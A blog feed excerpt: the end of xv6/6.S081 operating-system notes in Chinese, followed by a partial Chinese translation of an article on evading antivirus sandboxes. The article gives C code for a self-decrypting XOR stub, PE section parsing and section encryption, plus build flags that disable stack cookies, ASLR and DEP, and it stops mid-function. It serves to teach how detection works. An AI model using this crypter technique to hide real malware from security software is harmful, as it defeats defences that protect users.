id="chapter9">Chapter9</h1><p>产生中断后，操作系统需要做的是，保存当前的工作，处理中断，处理完成之后再恢复之前的工作。</p><p>中断与系统调用主要有3个小的差别：</p><ol type="1"><li>异步（asynchronous）。当硬件生成中断时，Interrupt handler与当前运行的进程在CPU上没有任何关联。但如果是系统调用的话，系统调用发生在运行进程的context下。</li><li>并发（concurrency）。对于中断来说，CPU和生成中断的设备是并行的在运行。网卡自己独立的处理来自网络的packet，然后在某个时间点产生中断，但是同时，CPU也在运行。所以我们在CPU和设备之间是真正的并行的，我们必须管理这里的并行。</li><li>program device。我们这节主要关注外部设备，例如网卡，UART，而这些设备需要被编程。每个设备都有一个编程手册，就像RISC-V有一个包含了指令和寄存器的手册一样。设备的编程手册包含了它有什么样的寄存器，它能执行什么样的操作，在读写控制寄存器的时候，设备会如何响应。不过通常来说，设备的手册不如RISC-V的手册清晰，这会使得对于设备的编程会更加复杂。</li></ol><p>接下来讨论终端中的$与按下键盘后ls是怎样在console显示出来的。</p><p>首先是中断的硬件部分。拿UART0举例，UART0会映射到内核内存地址的某处，而所有的物理内存都映射在地址空间的0x80000000之上。</p><p>下面是中断的软件部分。管理设备的代码称为驱动，所有的驱动都在内核中。</p><p>大部分的驱动都有bottom/top两个部分：</p><ul><li>bottom部分通常是Interrupt handler。当一个中断送到了CPU，并且CPU设置接收这个中断，CPU会调用相应的Interrupt handler。Interrupt handler并不运行在任何特定进程的context中，它只是处理中断。</li><li>top部分是用户部分或者内核调用的接口</li></ul><p>通常情况下，驱动中会有一些队列（或者说buffer），top部分的代码会从队列中读写数据，而Interrupt handler（bottom部分）同时也会向队列中读写数据。</p><p>也没啥想看的，都在跟源码，，passpass</p><h1 id="chapter10">Chapter10</h1><p>本章内容为锁相关。</p><blockquote><p>首先，我们来看一下为什么我们需要锁？故事要从应用程序想要使用多个CPU核开始。使用多个CPU核可以带来性能的提升，如果一个应用程序运行在多个CPU核上，并且执行了系统调用，那么内核需要能够处理并行的系统调用。如果系统调用并行的运行在多个CPU核上，那么它们可能会并行的访问内核中共享的数据结构。到目前为止，你们也看到了XV6有很多共享的数据结构，例如proc、ticks和我们之后会看到的buffer cache等等。当并行的访问数据结构时，例如一个核在读取数据，另一个核在写入数据，我们需要使用锁来协调对于共享数据的更新，以确保数据的一致性。所以，我们需要锁来控制并确保共享的数据是正确的。</p><p>但是实际的情况有些令人失望，因为我们想要通过并行来获得高性能，我们想要并行的在不同的CPU核上执行系统调用，但是如果这些系统调用使用了共享的数据，我们又需要使用锁，而锁又会使得这些系统调用串行执行，所以最后锁反过来又限制了性能。</p></blockquote><p>使用锁为了保证正确性，一个共享数据同时被读写时，如果没有锁，可能会出现race condition，条件竞争，进而导致程序出错。</p><h1 id="chapter11">Chapter11</h1><p>跳跳跳，编译原理</p><blockquote><p>一些6.s081的博客</p><ol type="1"><li>http://doraemonzzz.com/tags/6-S081/</li><li>https://fanxiao.tech/posts/MIT-6S081-notes/</li><li>https://www.cnblogs.com/weijunji/tag/XV6/</li><li>http://xv6.dgs.zone/labs/use_git/git1.html</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;6.s081看的是文档（比较快些），没看视频，：https://github.com/Ghostasky/MIT6.S081&lt;/p&gt;
&lt;p&gt;XV6:https://pdos.csail.mit.edu/6.828/2</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="OS" scheme="https://ghostasky.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>BypassAVDynamics[译]</title>
    <link href="https://ghostasky.github.io/2022/07/02/2022-6-29-BypassAVDynamics/"/>
    <id>https://ghostasky.github.io/2022/07/02/2022-6-29-BypassAVDynamics/</id>
    <published>2022-07-01T16:00:00.000Z</published>
    <updated>2022-07-12T06:30:58.168Z</updated>
    
    <content type="html"><![CDATA[<p>本文译的是《BypassAVDynamics》，也不能算译文，主要写自己读完之后学到的东西</p><p>好久之前的文章了，vt应该查杀挺多的，没测试</p><p>need read：</p><blockquote><p><a href="https://blog.sevagas.com/?PE-injection-explained">PE注入</a></p><p>这个应该写过，win32那里...</p></blockquote><p>[toc]</p><h1 id="简介">简介</h1><p>绕过AV的两大步骤：</p><ul><li>恶意代码的隐藏，通常使用加密完成</li><li>对解密存根进行编码，使其不会被检测为病毒，也不会被病毒绕过沙箱</li></ul><p>本文主要是第二种，欺骗绕过沙箱。</p><h1 id="免杀原理">免杀原理</h1><h2 id="静态分析">静态分析</h2><p>静态分析基于黑名单的方法，当AV分析师得到一个恶意样本，会提取一个签名，或者说特征码，特征码是基于特殊的代码和数据。特征码通常是使用可执行文件的第一个执行字节来构造的。</p><p>AV拥有包含数百万个签名的数据库，并将扫描后的代码与该数据库进行匹配比较。</p><p>第一代AV使用上述方法，现在仍在使用，同时结合了启发式与动态分析。</p><p>YARA这款工具可以用于创建规则来分类和识别恶意软件。这些规则被上传到AV和逆向工具中。YARA 可以在 <a href="https://www.77169.net/go?url=http://plusvic.github.io/yara/">http://plusvic.github.io/yara/</a>找到。</p><p>基于这种的分析方法不能够检测新的恶意软件。所以想要绕过基于特征码的分析，可以构建一个新的代码或者做一些小的修改，</p><h2 id="静态启发式分析">静态启发式分析</h2><p>在这种情况下，AV 将检查代码中已知存在于恶意软件中的模式。 有很多可能的规则，这取决于供应商。 这些规则通常没有描述（我想避免它们太容易被绕过）所以并不总是容易理解为什么 AV 认为软件是恶意的。 启发式分析的主要资产是它可以用来检测新的不在签名数据库中的恶意软件。 主要缺点是它会产生误报。</p><p>一个例子:函数<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-callnexthookex?redirectedfrom=MSDN">CallNextHookEx</a>一般被用户态的键盘记录器使用。一些杀软认为这个函数的用法是一个威胁，如果这个函数的名字在可执行文件中被检测到，将发出一个关于这个软件启发式的警告。</p><p>一个例子：一段代码打开“explorer.exe”进程，尝试写一些代码到其虚拟内存空间，这也被考虑为恶意的行为。</p><p>最容易的绕过启发式分析的方法是，确保所有的恶意代码是隐藏的。对于这个，编写解密的代码是最常用的方法。如果在解密之前，没有触发警告，如果这个解密Stub在解密完没有产生一些一般被认为恶意的行为，那么这个恶意软件不会被检测出来。</p><p>https://blog.sevagas.com/?Code-segment-encryption</p><p>https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable</p><h2 id="动态分析">动态分析</h2><p>如今大部分AV都是用动态的方法，当一个可执行文件被扫描，他将会在虚拟的环境中运行一小段时间。将此与签名验证和启发式分析相结合，可以检测未知恶意软件，即使是那些依赖加密的恶意软件。实际上，代码是在 AV 沙箱中自行解密的； 然后，对“新代码”的分析可能会引发一些可疑行为。如果使用加密/解密stub来隐藏恶意软件，倘若他们跳过解密阶段，大部分的AV会检测到它。</p><p>也就意味着，绕过动态分析依赖两个方面：</p><ul><li>具有不可检测的自解密机制（如启发式机制）</li><li>阻止AV执行解密stub</li></ul><h2 id="杀软的局限性">杀软的局限性</h2><p>三个主要的局限性：</p><ul><li>扫描必须快</li><li>环境是模拟的，因此不知道机器和恶意软件环境的特殊性</li><li>仿真/沙盒系统有一些可以被恶意软件检测出来的差异性</li></ul><h1 id="代码段加密">代码段加密</h1><h2 id="介绍">介绍</h2><blockquote><p>https://blog.sevagas.com/?Code-segment-encryption</p></blockquote><h2 id="原理">原理</h2><p>PE的经典构成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">======================</span><br><span class="line">PE Headers</span><br><span class="line">======================</span><br><span class="line">.textbss segment</span><br><span class="line">======================</span><br><span class="line">.text segment</span><br><span class="line">======================</span><br><span class="line">.rdata segment</span><br><span class="line">======================</span><br><span class="line">.data segment</span><br><span class="line">======================</span><br><span class="line">.rsrc segment</span><br><span class="line">======================</span><br></pre></td></tr></table></figure><ul><li><p>.textbss：为空，用于在虚拟内存中为未初始化的全局变量预留空间</p></li><li><p>.text：可执行代码</p></li><li><p>.rdata：包含只读数据它用于全局常量（包括字符串）。eg：<code>printf("hello");</code>"hello" 中进入<strong>.rdata</strong>。</p></li><li><p>.data：已初始化的非常量全局变量，全局变量<code>char var[] =  "var";</code>不是一个常量字符串，它是一个数组并且在 .data 中。</p></li><li><p>.rsrc：资源文件</p></li></ul><p>运行起来后（差异并不大）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">======================</span><br><span class="line">Environment variables</span><br><span class="line">======================</span><br><span class="line">Stack</span><br><span class="line">----------------------------------------</span><br><span class="line">Heap</span><br><span class="line">======================</span><br><span class="line">.textbss segment</span><br><span class="line">======================</span><br><span class="line">.text segment</span><br><span class="line">======================</span><br><span class="line">.rdata segment</span><br><span class="line">======================</span><br><span class="line">.data segment</span><br><span class="line">======================</span><br><span class="line">.rsrc segment</span><br><span class="line">======================</span><br></pre></td></tr></table></figure><p>下面：修改一个应用程序（目标），使另一个应用程序可以加密它的一个段。我们还希望目标应用程序在运行时自行解密。</p><ul><li>.code段将被加密</li><li>.stub用于解密.code段</li></ul><h3 id="工具">工具</h3><p>dumpbin，使用这个可以查看pe的东西</p><h2 id="调整目标软件">调整目标软件</h2><h3 id="创建.code段">创建.code段</h3><p>创建新段使用：<code>#pragma section</code></p><p>创建code段</p><p>在示例中，希望将可执行代码放入.code段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Your system includes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Declare .code as a read/write/execute segment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.code&quot;</span>,execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:.code,ERW&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* .code 段开始（下面所有生成的可执行代码都将进入 .code 段）*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.code&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="创建解密stub">创建解密stub</h3><p>为什么我们需要一个 .stub 段，因为我们不加密所有代码？好吧，我们需要加密器能够修补目标自解密例程，并且我们想要修补的代码将更容易在 .stub 部分中找到。本文的变体也可用于将所有段合并为一个（.code）。所以有 .stub 部分更通用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// .stub SECTION</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.stub&quot;</span>, execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.stub&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_BASE_ADDRESS0x15151515 <span class="comment">// 指向原始数据的dumpbin文件指针 (do not change, this will be patched by cryptor)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_SIZE0x14141414 <span class="comment">// 虚拟内存的dumpbin大小 (do not change, this will be patched by cryptor)</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Decrypt .code block encrypted by cryptor */</span></span><br><span class="line"><span class="comment">/* In this function do not declare array to avoid security cookies checks (see http://msdn.microsoft.com/en-us/library/8dbf701c.aspx) */</span></span><br><span class="line"><span class="comment">/* Or disable security check (GS- option) on prog compilation */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decryptCodeSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> nbytes;</span><br><span class="line"><span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line">BYTE  key[] = &#123; <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;<span class="comment">/* 注意：如果您打算加密 .rdata 段，请避免使用字符串 */</span></span><br><span class="line"><span class="keyword">int</span> keyLength = <span class="number">8</span>;</span><br><span class="line">ptr = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)CODE_BASE_ADDRESS;<span class="comment">/* 这将由cryptor修补*/</span></span><br><span class="line">nbytes = CODE_SIZE;<span class="comment">/* 这将由cryptor修补*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// decrypt code segment    </span></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span> ; i &lt; nbytes ; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">ptr[i]=ptr[i]^key[cpt];</span><br><span class="line">cpt = cpt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cpt == keyLength)</span><br><span class="line">cpt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Program first entry function */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">decryptCodeSection();</span><br><span class="line">realmain(); <span class="comment">/* Call decrypted program entry point */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译链接选项">编译链接选项</h3><p>因为目标会自我修改自己，所以我们必须避免使用安全 cookie（用于堆栈验证）。为此，我们需要删除安全检查。因此，下一个编译选项是强制性的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/GS-  -&gt; Disable functions stack verification relying on secure cookies</span><br></pre></td></tr></table></figure><p>另一个选项几乎是强制性的，静态包含运行时库。如果目标中未包含 Microsoft 运行时库，则此代码将起作用，但您将面临可移植性问题。 使用接下来的两个运行时库选项之一。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/MTD -&gt; <span class="keyword">for</span> debug</span><br><span class="line">/MT  -&gt; <span class="keyword">for</span> release</span><br></pre></td></tr></table></figure><p>为了避免复杂化，我们希望修复地址并删除数据执行预防。为此，我们必须使用链接器的下一个选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/DYNAMICBASE:NO</span><br><span class="line">/FIXED</span><br><span class="line">/NXCOMPAT:NO</span><br></pre></td></tr></table></figure><h2 id="构建加密器">构建加密器</h2><h3 id="获取需要的信息">获取需要的信息</h3><p>加密器的作用是加密目标程序的 .code 段以及修补 .stub 段，以便目标在启动时能够自解密。 为此，密码器将浏览上一节中生成的二进制文件，并找到 .code 和 .stub 段的地址和大小。我们需要文件偏移量（修改二进制目标）和虚拟内存地址（向目标程序指示他应该在运行时解密的段在哪里）。</p><p>首先，需要使用 CreateFileMapping 和 MapViewOfFile 将文件映射到内存中。我没有对此代码进行任何功能修改。它可以在书中或在互联网上找到。 完成此操作后，我们解析映射文件以获取节标题信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get information of .code and .stub segments</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getSegmentsInfo</span><span class="params">(LPVOID baseAddress, SEGMENT_INFO_PTR codeSegmentInfo, SEGMENT_INFO_PTR stubSegmentInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS peHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 optionalHeader;</span><br><span class="line"></span><br><span class="line">    dosHeader = (PIMAGE_DOS_HEADER)baseAddress;</span><br><span class="line">    <span class="keyword">if</span> (((*dosHeader).e_magic) != IMAGE_DOS_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: Dos signature not matched\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: Dos signature=%X\n&quot;</span>, (*dosHeader).e_magic);</span><br><span class="line"></span><br><span class="line">    peHeader = (PIMAGE_NT_HEADERS)((DWORD)baseAddress + (*dosHeader).e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (((*peHeader).Signature) != IMAGE_NT_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: PE signature not matched\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: PE signature=%X\n&quot;</span>, (*peHeader).Signature);</span><br><span class="line"></span><br><span class="line">    optionalHeader = (*peHeader).OptionalHeader;</span><br><span class="line">    <span class="keyword">if</span> ((optionalHeader.Magic) != <span class="number">0x10B</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: Optional header magic number does not match\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: OPtional header magic nb=%X\n&quot;</span>, optionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">    (*codeSegmentInfo).moduleBase = optionalHeader.ImageBase;</span><br><span class="line">    (*stubSegmentInfo).moduleBase = optionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: # sections=%d\n&quot;</span>, (*peHeader).FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill code information with content of code segment */</span></span><br><span class="line">    TraverseSectionHeaders(IMAGE_FIRST_SECTION(peHeader), (*peHeader).FileHeader.NumberOfSections, codeSegmentInfo, <span class="string">&quot;.code&quot;</span>);</span><br><span class="line">    TraverseSectionHeaders(IMAGE_FIRST_SECTION(peHeader), (*peHeader).FileHeader.NumberOfSections, stubSegmentInfo, <span class="string">&quot;.stub&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一个函数用于获取任何部分的下一个信息：</p><ul><li>原始文件中的段偏移量</li><li>文件段大小</li><li>段的虚拟内存偏移量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Look for sectionName segment in mapped file</span></span><br><span class="line"><span class="comment"> * addrInfo will be filled with the segment information</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseSectionHeaders</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PIMAGE_SECTION_HEADER section,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD nSections,</span></span></span><br><span class="line"><span class="params"><span class="function">    SEGMENT_INFO_PTR addrInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span> *sectionName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD i;</span><br><span class="line">    <span class="comment">/* Copy pointer to initial section (so this function can be called several times) */</span></span><br><span class="line">    PIMAGE_SECTION_HEADER localSection = section;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nTraverseSectionHeaders: searching for segment in section headers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;     ====================     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tName:%s\n&quot;</span>, (*section).Name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>((*section).Name, sectionName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            (*addrInfo).fileSegmentOffset = (*section).PointerToRawData; <span class="comment">/* Location of segment in binary file*/</span></span><br><span class="line">            (*addrInfo).fileSegmentSize = (*section).SizeOfRawData;      <span class="comment">/* Size of segment */</span></span><br><span class="line">            (*addrInfo).memorySegmentOffset = (*section).VirtualAddress; <span class="comment">/* Offset of segment in memory at runtime */</span></span><br><span class="line">        &#125;</span><br><span class="line">        section = section + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密目标段">加密目标段</h2><p>现在我们有了二进制文件中 .code 段的大小和位置，我们可以打开文件并加密想要的字节。 该代码并未真正优化，但对于调试目的非常实用。在这个函数中，我们：</p><ul><li>打开二进制目标文件</li><li>寻找 .code 段</li><li>在缓冲区中加载 .code 段</li><li>加密缓冲区</li><li>写入加密缓冲区代替明文 .code 段</li><li>关闭文件并离开</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Encrypt .code segment bytes in the given file </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cipherBytes</span><span class="params">(<span class="keyword">char</span>* fileName, SEGMENT_INFO_PTR addrInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD fileOffset;</span><br><span class="line">DWORD nbytes;</span><br><span class="line"> </span><br><span class="line">FILE* fptr;</span><br><span class="line">BYTE *buffer;</span><br><span class="line">DWORD nItems;</span><br><span class="line">DWORD i;</span><br><span class="line">BYTE  key[] = <span class="string">&quot;ab345izz&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> keyLength = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">fileOffset = addrInfo-&gt;fileSegmentOffset;</span><br><span class="line">nbytes = addrInfo-&gt;fileSegmentSize;</span><br><span class="line"><span class="comment">/* Allocate memory in buffer that will store content of segment */</span></span><br><span class="line">buffer = (BYTE*)<span class="built_in">malloc</span>(nbytes);</span><br><span class="line"><span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: malloc error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Open binary file */</span></span><br><span class="line">fptr = fopen(fileName,<span class="string">&quot;r+b&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fptr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: fopen error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Seek .code section using calculated offset and copy content into buffer*/</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, fileOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Unable to set file pointer to %ld \n&quot;</span>, fileOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">nItems = fread(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: 